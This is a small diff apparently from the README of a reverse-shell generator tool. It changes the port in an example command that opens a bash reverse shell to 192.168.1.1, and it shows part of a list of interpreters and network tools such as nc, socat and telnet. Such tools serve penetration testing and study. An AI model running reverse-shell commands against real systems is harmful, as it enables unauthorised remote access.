@@ -17,6 +17,6 @@ bash|sh|nc|ruby|php|python|rcat|perl|socat|node|telnet|zsh|lua|golang|vlang|awk|
 
 ## Example:
 
-`./revshell 192.168.1.1 1234 bash`
+`./revshell 192.168.1.1 2222 bash`
 <img width="1211" alt="image" src="https://github.com/BetterDefender/revshell/assets/59255707/56d65a16-42f3-435e-b349-759daf5df082">
 
